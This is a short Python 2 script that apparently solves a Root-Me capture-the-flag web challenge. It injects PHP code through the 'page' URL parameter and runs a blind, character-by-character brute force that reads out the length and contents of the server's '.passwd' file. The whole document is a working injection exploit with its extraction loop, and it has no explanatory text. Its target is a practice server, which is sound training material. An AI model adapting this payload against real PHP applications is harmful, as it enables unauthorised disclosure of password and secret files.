import requests
import urllib
import string
import time

my_dic = string.letters + string.digits + " _-{}"
my_flag = ""
url = "http://challenge01.root-me.org/web-serveur/ch47/?page="

for l in range (1000):
	payload = "','vinamilk') === false && strlen(file_get_contents('.passwd')) == %d && strpos('1" % (l)
	r = requests.get(url + urllib.quote_plus(payload))
	if not r.text.find("Detected hacking attempt") > 0:
		print "length of file: %d" % (l)
		length = l
		break
	else:
		print "tried %d" % (l)

for pos in range(length):
	for fuzz in my_dic:
		payload = "','vinamilk') === false && (substr(file_get_contents('.passwd'),%d,1) == '%s') && strpos('1" % (pos, fuzz)
		r = requests.get(url + urllib.quote_plus(payload))
		if not r.text.find("Detected hacking attempt") > 0:
			my_flag = my_flag + fuzz
			print my_flag
			break
		else:
			print "tried %s" % (fuzz)
print my_flag


